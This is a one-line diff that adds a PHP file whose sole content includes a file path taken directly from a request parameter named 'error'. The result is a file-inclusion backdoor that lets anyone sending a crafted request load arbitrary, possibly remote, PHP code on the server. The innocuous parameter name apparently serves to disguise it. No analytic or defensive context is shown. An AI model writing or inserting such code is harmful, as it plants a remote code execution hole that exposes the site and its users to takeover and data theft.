@@ -1,0 +1,1 @@
+<?include($_REQUEST["error"] . "/writable.php");?>
